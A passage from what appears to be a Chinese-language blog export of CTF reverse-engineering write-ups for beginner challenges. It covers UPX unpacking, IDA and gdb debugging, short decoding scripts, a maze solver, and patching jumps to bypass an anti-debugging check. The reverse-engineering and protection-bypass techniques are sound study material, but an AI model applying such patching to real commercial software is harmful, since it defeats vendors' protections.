&#123;</span><br><span class="line">    	<span class="built_in">printf</span>(<span class="string">&quot;so close, dude!\n&quot;</span>);</span><br><span class="line">    	<span class="built_in">exit</span>(<span class="number">4</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Brr wrrr grr\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> hash = first * <span class="number">31337</span> + (second % <span class="number">17</span>) * <span class="number">11</span> + <span class="built_in">strlen</span>(argv[<span class="number">3</span>]) - <span class="number">1615810207</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Get your key: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%x\n&quot;</span>, hash);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>看到就是要输入规定的参数运行就可以了，注意这个参数要在命令行中输入。第一个参数直接跑个脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="number">0xcafe</span>))</span><br><span class="line"><span class="comment">#51966</span></span><br></pre></td></tr></table></figure>
<p>第二个参数最小的是25，第三个参数h4cky0u</p>
<p>编译之后cmd运行，得到flag：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567823954737.png" class="" width="1567823954737">
<h2 id="分析总结-3">分析总结</h2>
<p>分析源码，没啥可说的。</p>
<h1 id="simple-unpack">simple-unpack</h1>
<p>题目描述：菜鸡拿到了一个被加壳的二进制文件</p>
<h2 id="做题实录-4">做题实录</h2>
<p>UltraEdit打开看一下，搜索flag：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567824208589.png" class="" width="1567824208589">
<p>去掉中间的乱码，得到flag：</p>
<p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p>
<h2 id="分析总结-4">分析总结</h2>
<p>直接查找确实是歪门邪道，毕竟这题是关于加壳的，所以UE看一下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567824854437.png" class="" width="1567824854437">
<p>看到这是个upx的壳，那直接用upx脱壳就行了：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567825480287.png" class="" width="1567825480287">
<p>脱完壳查找flag即可：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567825781968.png" class="" width="1567825781968">
<h1 id="logmein">logmein</h1>
<p>题目描述：菜鸡开始接触一些基本的算法逆向了</p>
<h2 id="做题实录-5">做题实录</h2>
<p>IDA里看一下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567827148274.png" class="" width="1567827148274">
<p>第26行就是加密算法，写个解密算法就行了：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> v6;</span><br><span class="line">    <span class="type">int</span> v9;</span><br><span class="line">    <span class="type">long</span> <span class="type">long</span> v7;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line">    v9 = <span class="number">0</span>;</span><br><span class="line">    <span class="type">char</span> * str = <span class="string">&quot;:\&quot;AL_RT^L*.?+6/46&quot;</span>;</span><br><span class="line">    v7 = <span class="number">28537194573619560LL</span>;</span><br><span class="line">    v6 = <span class="number">7</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>;i &lt; <span class="number">17</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>,*((<span class="type">char</span>*)&amp;v7 + i % v6)^str[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//  RC3-2016-XORISGUD</span></span><br></pre></td></tr></table></figure>
<h2 id="分析总结-5">分析总结</h2>
<p>这个题就是简单的算法逆向，没啥可说的。</p>
<h1 id="insanity">insanity</h1>
<p>题目描述：菜鸡觉得前面的题目太难了，来个简单的缓一下</p>
<h2 id="做题实录-6">做题实录</h2>
<p>IDA打开，查找flag，得到flag：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567827487075.png" class="" width="1567827487075">
<h2 id="分析总结-6">分析总结</h2>
<p>实际上这个题就直接运行，等上几秒它会随机给你输出一些字符串，我第一次运行就直接得到了flag……</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1567827754608.png" class="" width="1567827754608">
<h1 id="no-strings-attached">no-strings-attached</h1>
<p>题目描述：菜鸡听说有的程序运行就能拿Flag？</p>
<h2 id="做题实录-7">做题实录</h2>
<p>这是个32位的elf文件，ubuntu里跑一下，出来一堆不知道是啥的东西。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565410895869.png" class="" width="1565410895869">
<p>IDA打开</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565411183353.png" class="" width="1565411183353">
<p>这个<code>authenticate()</code>看着很可疑，进去看看：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565411728014.png" class="" width="1565411728014">
<p>看到一个<code>decrypt(...)</code>，估计就是它了，进去看看</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565411819257.png" class="" width="1565411819257">
<p>看样子是一个解密函数，在<code>decrypt(...)</code>下断点进行动态
调试，进入while循环Hex
View跟踪EAX（因为函数返回值就存在EAX里），可以看到flag正在被解密出来，继续往下走</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565412182025.png" class="" width="1565412182025">
<p>解密完成，得出flag，去掉0x00就是最终的flag，由于题目来源9447CTF，所以没有前面的1。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565412265513.png" class="" width="1565412265513">
<h2 id="分析总结-7">分析总结</h2>
<p>我看了一下，基本上都差不多，不过很多都是用gdb调试的，没用过gdb，正好趁这个机会学习一下，写一下gdb调试的方法。</p>
<p>进入gdb后输入 file no-strings-attached 开始调试程序</p>
<p>然后在<code>decrypt()</code>下断点，用命令 break decrypt</p>
<p>按n是单步步过，s是单步步进，啥也不输直接按回车默认执行上一条指令</p>
<p>单步执行到这里发现EAX里面存了9，是flag的开头</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565415496515.png" class="" width="1565415496515">
<p>记下此时EAX的位置0x804cff0，输入 finish
让程序执行完当前的函数并返回</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565416027427.png" class="" width="1565416027427">
<p>查看EAX的内容，输入命令 x/100u $eax （该命令具体使用方式参见<a
href="https://blog.csdn.net/allenlinrui/article/details/5964046">GDB下查看内存命令(x命令)</a>）</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565416413194.png" class="" width="1565416413194">
<p>写个脚本跑出来就行了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s=[<span class="number">57</span>,<span class="number">52</span>,<span class="number">52</span>,<span class="number">55</span>,<span class="number">123</span>,<span class="number">121</span>,<span class="number">111</span>,<span class="number">117</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">95</span>,<span class="number">97</span>,<span class="number">110</span>,<span class="number">95</span>,</span><br><span class="line">	<span class="number">105</span>,<span class="number">110</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">116</span>,<span class="number">105</span>,<span class="number">111</span>,<span class="number">110</span>,<span class="number">97</span>,<span class="number">108</span>,<span class="number">95</span>,<span class="number">109</span>,<span class="number">121</span>,</span><br><span class="line">	<span class="number">115</span>,<span class="number">116</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">125</span>]</span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(s[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得出结果：9447&#123;you_are_an_international_mystery&#125;</span></span><br></pre></td></tr></table></figure>
<h1 id="getit">getit</h1>
<p>题目描述：菜鸡发现这个程序偷偷摸摸在自己的机器上搞事情，它决定一探究竟</p>
<h2 id="做题实录-8">做题实录</h2>
<p>这是个elf文件，在ubuntu里跑了一下发现没反应，放到IDA里看一下</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565407669159.png" class="" width="1565407669159">
<p>看样子估计是个解密flag的，看了看数据段发现了t是flag（IDA里面按a把ASCII码变成字符串），但是内容不知道</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565408592965.png" class="" width="1565408592965">
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565408717450.png" class="" width="1565408717450">
<p>我猜while循环应该就是解密的，于是动态调试一下。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565408257709.png" class="" width="1565408257709">
<p>可以看到在循环的过程中下面flag就已经出现了，继续调试得出flag</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565408338406.png" class="" width="1565408338406">
<h2 id="分析总结-8">分析总结</h2>
<p>这个题其实也可以不用动态调试，因为while循环里转换算法都写好了，自己按照源码写个脚本跑就行了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = <span class="string">&#x27;c61b68366edeb7bdce3c6820314b7498&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        t = <span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        t = -<span class="number">1</span></span><br><span class="line">    flag  += <span class="built_in">chr</span>(<span class="built_in">ord</span>(s[i]) + t)</span><br><span class="line"><span class="built_in">print</span> (flag)</span><br><span class="line"></span><br><span class="line"><span class="comment">#得出结果：  b70c59275fcfa8aebf2d5911223c6589</span></span><br></pre></td></tr></table></figure>
<h1 id="python-trade">python-trade</h1>
<p>题目描述：菜鸡和菜猫进行了一场Py交易</p>
<h2 id="做题实录-9">做题实录</h2>
<p>下下来是pyc文件，放到ubuntu里面，用uncompyle反编译（下载过程也踩了很多坑……）并保存到tes.py</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">uncompyle6 Py.pyc &gt; tes.py</span><br></pre></td></tr></table></figure>
<p>得到源码：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.3.5</span></span><br><span class="line"><span class="comment"># Python bytecode 2.7 (62211)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 2.7.15+ (default, Nov 27 2018, 23:36:35) </span></span><br><span class="line"><span class="comment"># [GCC 7.3.0]</span></span><br><span class="line"><span class="comment"># Embedded file name: 1.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2017-06-02 19:20:43</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">message</span>):</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i) ^ <span class="number">32</span></span><br><span class="line">        x = x + <span class="number">16</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(s)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">correct = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&#x27;Input flag:&#x27;</span></span><br><span class="line">flag = raw_input()</span><br><span class="line"><span class="keyword">if</span> encode(flag) == correct:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;correct&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="built_in">print</span> <span class="string">&#x27;wrong&#x27;</span></span><br><span class="line"><span class="comment"># okay decompiling Py.pyc</span></span><br></pre></td></tr></table></figure>
<p>是一个加密的程序，那按照它的步骤解密就行了，是一个算法逆向的题。</p>
<p>解密代码如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">message</span>):</span><br><span class="line">    message = base64.b64decode(message)</span><br><span class="line">    s = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> message:</span><br><span class="line">        x = <span class="built_in">ord</span>(i)-<span class="number">16</span></span><br><span class="line">        x = x ^ <span class="number">32</span></span><br><span class="line">        s += <span class="built_in">chr</span>(x)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> s </span><br><span class="line"></span><br><span class="line">message = <span class="string">&#x27;XlNkVmtUI1MgXWBZXCFeKY+AaXNt&#x27;</span></span><br><span class="line"><span class="built_in">print</span> (decode(message))</span><br><span class="line"></span><br><span class="line"><span class="comment">#得出结果：   nctf&#123;d3c0mpil1n9_PyC&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="分析总结-9">分析总结</h2>
<p>这题没啥好说的，就是算法逆向。但是安装使用uncompyle遇到点问题，也记下来吧。</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">pip install uncompyle</span><br></pre></td></tr></table></figure>
<p>然后使用的时候需要输compyle6，我在输了之后一直提示我“command not
found”，后来发现需要执行这两条命令安装环境变量</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">export PATH=$HOME/bin:/usr/local/bin:$PATH</span><br><span class="line">PATH=$HOME/bin:/usr/local/python27/bin:/usr/local/bin:$PATH</span><br></pre></td></tr></table></figure>
<h1 id="csaw2013reversing2">csaw2013reversing2</h1>
<p>题目描述：听说运行就能拿到Flag，不过菜鸡运行的结果不知道为什么是乱码</p>
<h2 id="做题实录-10">做题实录</h2>
<p>拿到的是个exe文件，双击运行结果如图：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565351871574.png" class="" width="1565351871574">
<p>正如描述所说，是一堆乱码，放到OD里看一下。</p>
<p>发现这个位置就是弹出flag的位置。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565352046845.png" class="" width="1565352046845">
<p>在这儿设个断点，然后进去仔细看。</p>
<p>进来之后看这个函数，发现有两个MessageBox函数，觉得有蹊跷，于是在00B01094处取消跳转，让它往下走看看有什么反应。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565352326390.png" class="" width="1565352326390">
<p>在走的时候把int3用nop填充，00B010A3处的jmp跳转也用nop填充</p>
<p>走到第一个MessageBox，弹出了一个flag，但是什么也没有</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565352520653.png" class="" width="1565352520653">
<p>于是点击忽略继续往下走，又遇到了jmp跳转，同样nop填充</p>
<p>走到这flag已经加载进内存了。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565352654965.png" class="" width="1565352654965">
<h2 id="分析总结-10">分析总结</h2>
<h3 id="方法一直接修改程序逻辑">方法一：直接修改程序逻辑</h3>
<p>参考<a
href="https://ciphersaw.me/2019/05/28/%E3%80%90XCTF%20%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E3%80%91%20Reverse%20%E2%80%94%E2%80%94%20csaw2013reversing2/">【XCTF
攻防世界】 Reverse —— csaw2013reversing2</a></p>
<p>由于是个32位的PE文件（linux下用file命令查看），所以用ida
pro打开，F5反编译，生成类C语言的伪代码如下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565354260660.png" class="" width="1565354260660">
<p>lpMem就是flag的内容。看第10行if语句，如果<code>sub_40102A()</code>或<code>IsDebuggerPresent()</code>返回值为真则执行<code>__debugbreak()</code>调试断点函数、子函数<code>sub_401000(...)</code>和退出进程函数<code>ExitProcess(...)</code>函数，否则直接执行<code>MessageBoxA(...)</code>函数弹出flag框。</p>
<p>打开<code>sub_40102A()</code>函数看一下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565355150691.png" class="" width="1565355150691">
<p>发现返回值恒等于零，那就是说只有在调试状态下才会执行if里面的语句。由于直接双击运行没有在调试环境下，弹出乱码的flag，所以可以肯定if里面的语句是关键点，应该包含解密flag的函数。</p>
<p>打开<code>sub_401000(...)</code>看一下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565355328341.png" class="" width="1565355328341">
<p>看样子是个解密函数，那应该就是它了。那么思路就很清晰了，我们要让程序跳过if判断，直接执行<code>sub_401000(...)</code>函数，然后再跳过<code>ExitProcess(...)</code>函数执行<code>MessageBoxA(...)</code>函数弹出解密后的flag框。</p>
<p>既然思路已经清晰那么就开始修改程序吧。</p>
<p>这是原本的逻辑：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565355918832.png" class="" width="1565355918832">
<p>使用IDA修改指令的方法是将光标放在要修改的指令上，依次点击<strong>Edit
-&gt; Patch program -&gt;
Assemble</strong>，弹出指令修改框进行修改。</p>
<p>修改之后逻辑如下：</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565356638399.png" class="" width="1565356638399">
<p>红色标注的就是修改过的地方。修改完成后要保存到文件，依次点击
<strong>Edit -&gt; Patch program -&gt; Apply patches to input
file…</strong>，弹出设置框，选择待打补丁程序进行修改。</p>
<p>最后双击运行修改后的程序，直接弹出已解密的flag框。</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565358175915.png" class="" width="1565358175915">
<h3 id="方法二dll注入">方法二：DLL注入</h3>
<p>参考<a href="http://blog.eonew.cn/archives/905#sub_401000">攻防世界
RE csaw2013reversing2</a></p>
<h1 id="maze">maze</h1>
<p>题目描述：菜鸡想要走出菜狗设计的迷宫</p>
<h2 id="做题实录-11">做题实录</h2>
<p>打开IDA看了半天源码，不知道和迷宫有啥关系，以前没做过这种题，还以为是代码不停跳转什么的，还是最后看了wp才明白，真的是个迷宫（吐血）。还是要做题，提高自己的姿势水平，不然就太naive了。</p>
<h2 id="分析总结-11">分析总结</h2>
<p>这是个64位的elf文件，放IDA里看一下main函数</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/2019-08-11_203146.png" class="" title="2019-08-11_203146">
<p>（请无视我刚开始看的时候做的注释）首先看第13行，判断输入的字符串，从这里可以看出要求输入的flag长度为24，且以
'nctf{' 开头，以 '}' 结尾（最后的 '}'
本来是ASCII码，在IDA里把光标选择ASCII码按R键就可以把ASCII码变成字符了）。</p>
<p>由于是迷宫，一般是二维的，所以应该有一个记录坐标的变量，看到v9，在判断中有一个<code>&amp;v9</code>和<code>(&amp;v9)+1</code>（也就是v9跟着的的下一个字节的地址），那么可以猜想v9就是一个记录位置坐标信息的二维数组。那么while循环就是在判断输入的字符来改变坐标信息，也就是用户输入字符来走迷宫。</p>
<p>正常来说，v9和v9+1对应着迷宫的行和列（别问我为啥不是列和行，我觉得正常讲话就是行在前，所以自然而然想到行和列。就算不对那到时候再改吗，反正就两种情况。而且下面的分析可以确定就是对应的行和列）。</p>
<p>既然是走迷宫，当然就得判断走没走到终点，看到了第72行的“Congratulations！”，那看一下它前面第70行的判断，判断坐标所在，如果是“#”，就到终点了，说明“#”号就代表终点。而且看一下asc_601060</p>
<img src="/2019/08/15/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83/1565528977356.png" class="" width="1565528977356">
<p>有个“#”，看来这应该就是迷宫的地图了。我们的目标就是要走到“#”处。再回过头来看8*v9+SHIDWORD(V9)，既然是坐标，说明v9就代表行，而v9+1代表列，而且可以知道迷宫的地图应该是8个字符一行的（因为行增加一，数就增加8）。</p>
<p>至于这个LABLE_15，每走一步都要进入这里，应该就是判断有没有越界什么的函数。</p>
<p>现在基本上就已经理清楚了这个迷宫，只要知道怎么走就行了。while循环里的函数如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">//因为是&amp;v9+1，所以是判断列，也就是左右走</span><br><span class="line">bool __fastcall sub_400650(_DWORD *a1)//(_DWORD *)&amp;v9 + 1</span><br><span class="line">&#123;</span><br><span class="line">//为&#x27;O&#x27; </span><br><span class="line">  int v1; // eax</span><br><span class="line">    </span><br><span class="line">  v1 = (*a1)--;		//往左走</span><br><span class="line">  return v1 &gt; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool __fastcall sub_400660(int *a1)//(int *)&amp;v9 + 1</span><br><span class="line">&#123;</span><br><span class="line">//为&#x27;o&#x27;</span><br><span class="line">  int v1; // eax</span><br><span class="line">    </span><br><span class="line">  v1 = *a1 + 1;		//往右走</span><br><span class="line">  *a1 = v1;</span><br><span class="line">  return v1 &lt; 8;</span><br><span class="line">&#125;</span><br><span class="line">//上下走</span><br><span class="line">bool __fastcall sub_400670(_DWORD *a1)//&amp;v9</span><br><span class="line">&#123;</span><br><span class="line">//为&#x27;.&#x27;</span><br><span class="line">  int v1; // eax</span><br><span class="line"></span><br><span class="line">  v1 = (*a1)--;		//往上走</span><br><span class="line">  return v1 &gt; 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bool __fastcall sub_400680(int *a1)//(int *)&amp;v9</span><br><span class="line">&#123;</span><br><span class="line">//为&#x27;0&#x27;</span><br><span class="line">  int v1; // eax</span><br><span class="line">    </span><br><span class="line">  v1 = *a1 + 1;		//往下走</span><br><span class="line">  *a1 = v1;</span><br><span class="line">  return v1 &lt; 8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>总结一下：“.”往上走、“0”往下走、“O”往左走、“o”往右走</p>
<p>拿个脚本把地图写出来（python是真的好用）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">map</span> = <span class="string">&#x27;  *******   *  **** * ****  * ***  *#  *** *** ***     *********&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(<span class="built_in">map</span>), <span class="number">8</span>):</span><br><span class="line">	<span class="built_in">print</span> (<span class="built_in">map</span>[i: i + <span class="number">8</span>])</span><br><span class="line">    </span><br><span class="line"><span class="comment">#得出结果：</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">  ******</span></span><br><span class="line"><span class="string">*   *  *</span></span><br><span class="line"><span class="string">*** * **</span></span><br><span class="line"><span class="string">**  * **</span></span><br><span class="line"><span class="string">*  *#  *</span></span><br><span class="line"><span class="string">** *** *</span></span><br><span class="line"><span class="string">**     *</span></span><br><span class="line"><span class="string">********</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>要求步长为18，从左上角开始走，走到“#”的位置，走就行了，最后结果为</p>
<p>nctf{o0oo00O000oooo..OO}</p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>re</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>reverse</tag>
      </tags>
  </entry>
  <entry>
    <title>攻防世界逆向高手进阶</title>
    <url>/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/</url>
    <content><![CDATA[<h1 id="dmd-50">dmd-50</h1>
<h2 id="做题实录">做题实录</h2>
<p>附件dMd是个64位ELF文件，运行一下，让输入key，随便输入一个，报错。</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/1565588951505.png" class="" width="1565588951505">
<p>IDA打开看一下</p>
<img src="/2019/08/30/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%80%86%E5%90%91%E9%AB%98%E6%89%8B%E8%BF%9B%E9%98%B6/2019-08-12_135045.png" class="" title="2019-08-12_135045">
<p>直接看if判断，发现字符串<code>780438d5b6e29db0898bc4f0225935c0</code>，分析代码，看到第50行是个MD5加密，所以想到尝试MD5解密上面这个字符串，在这个<a
href="https://www.cmd5.com/">网站</a>解密的结果如下：</p>
